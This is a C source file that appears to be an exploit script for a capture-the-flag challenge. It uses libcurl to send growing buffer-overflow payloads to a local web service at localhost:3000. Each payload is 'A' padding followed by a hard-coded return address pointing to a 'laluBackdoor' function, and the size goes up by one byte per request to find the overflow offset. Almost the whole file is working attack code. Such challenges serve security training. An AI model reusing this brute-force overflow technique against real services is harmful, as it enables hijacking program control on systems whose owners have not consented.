#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <unistd.h>

#define BUFFER_SIZE 64 //buffsize from the challenge code 
#define MAX_PAYLOAD_SIZE 1024 //random one

unsigned char laluBackdoor_address[] = { 0x91, 0xeb, 0x61, 0x00 }; //little endian

int sendPayload(const char* payload) {
    CURL *curl;
    CURLcode res;
    char url[MAX_PAYLOAD_SIZE];
    snprintf(url, sizeof(url), "http://localhost:3000/?gown=%s", payload);
    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    return 0;
}

void craftPayload(char* payload, size_t padding_size) {
    //try different size of payload and check docker logs in the meantime
    memset(payload, 'A', padding_size);
    memcpy(payload + padding_size, laluBackdoor_address, sizeof(laluBackdoor_address));
    payload[padding_size + sizeof(laluBackdoor_address)] = '\0';
}

int main() {
    char payload[MAX_PAYLOAD_SIZE];
    size_t padding_size = BUFFER_SIZE;
    int boobool = 1;
    while (boobool) {
        craftPayload(payload, padding_size);
        int result = sendPayload(payload);
        if (result == -1) {
            fprintf(stderr, "[X]Error sending payload.\n");
            return 1;
        }
        printf("[+]Â¨Payload sent, size: %zu\n", padding_size);
        if (padding_size < MAX_PAYLOAD_SIZE) {
            padding_size++;
        } else {
            boobool = 0;
        }
        sleep(1);
    }
    //printf("[DONE], payload size: %zu!\n", padding_size);
    return 0;
}
